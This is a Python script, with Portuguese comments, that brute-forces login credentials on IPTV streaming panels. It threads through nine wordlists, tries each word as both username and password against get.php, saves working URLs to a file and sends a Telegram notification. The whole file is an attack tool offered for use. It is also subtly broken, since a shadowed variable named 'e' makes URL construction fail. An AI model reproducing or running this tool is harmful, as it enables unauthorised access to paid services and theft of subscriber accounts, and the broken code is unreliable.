from requests import get
from threading import Thread, BoundedSemaphore
from tqdm import tqdm
from iptv.iptv import Iptv_analyzer
import logging

# Inicializando a classe e log
cv = Iptv_analyzer()
logging.basicConfig(filename='errors.log', level=logging.ERROR)

# Limitar o número de threads simultâneas
max_threads = 5
semaphore = BoundedSemaphore(max_threads)

# Entrada de URL e cabeçalhos
e = input('Digite a URL com a porta: ')
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) "
                  "AppleWebKit/537.36 (KHTML, like Gecko) "
                  "Chrome/83.0.4103.97 Safari/537.36"
}

def bruteForce(wordlist):
    with semaphore:  # Limitar o número de threads simultâneas
        try:
            with open(wordlist, 'r', encoding="utf8") as myfile:
                total_lines = sum(1 for _ in myfile)
                myfile.seek(0)  # Volta ao início do arquivo após contagem
                loop = tqdm(total=total_lines, position=0, leave=False, desc=f'Processando {wordlist}')
                
                for line in myfile:
                    line = line.strip()
                    url = f'{e}/get.php?username={line}&password={line}&type=m3u'
                    
                    try:
                        resposta = get(url, headers=headers, timeout=10)
                        if resposta.status_code == 200:
                            cv.iptv(url, e)
                            with open('contas.txt', 'a') as a:
                                a.write(f'{url}\n')
                    except Exception as error:
                        logging.error(f"Erro ao processar {url}: {error}")
                        continue
                    
                    loop.update(1)
                
                loop.close()
        except Exception as e:
            logging.error(f"Erro ao abrir a wordlist {wordlist}: {e}")

if __name__ == '__main__':
    listas = ["wl1.txt", 'wl2.txt', 'wl3.txt', 'wl4.txt', 'wl5.txt', 'wl6.txt', 'wl7.txt', 'wl8.txt', 'wl9.txt']
    procs = []

    for lista in listas:
        proc = Thread(target=bruteForce, args=(lista,))
        procs.append(proc)
        proc.start()

    for proc in procs:
        proc.join()

    # Enviar mensagem no Telegram
    cv.sendTelegram()
